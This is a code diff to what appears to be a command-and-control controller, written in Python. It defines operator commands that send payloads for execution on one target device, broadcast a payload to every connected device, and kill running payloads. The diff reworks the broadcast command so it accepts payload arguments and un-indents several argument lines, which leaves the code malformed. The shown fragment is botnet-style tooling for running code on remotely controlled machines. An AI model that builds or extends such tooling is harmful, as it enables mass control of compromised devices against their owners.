@@ -47,25 +47,24 @@ def cpay(x):
     if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
     return ds[x[0]].send(Packet("execute", x[1]))
 
+@cc.command(["paydis", "payloaddis"],
+    Arg(str, "Payload."),
+    Arg(str, "arguments", optional=True, multi=True))
+def cpaydis(x):
+    return ds.distribute_packet(Packet("execute", "<x>".join([y for y in x if y != None])))
+
 @cc.command(["active"],
-    Arg(str, "target device"))
+Arg(str, "target device"))
 def cactive(x):
     if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
     return ds[x[0]].send(Packet("active"))
 
 @cc.command(["paykill"],
-    Arg(str, "target device"),
-    Arg(str, "Payload."))
+Arg(str, "target device"),
+Arg(str, "Payload."))
 def cpaykill(x):
     if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
     return ds[x[0]].send(Packet("paykill", x[1]))
-
-
-@cc.command(["payloaddis", "paydis"],
-    Arg(str, "Payload."))
-def cpaydis(x):
-    return ds.distribute_packet(Packet("execute", x[0]))
-
 
 @cc.command(["file"],
     Arg(str, "target device"),
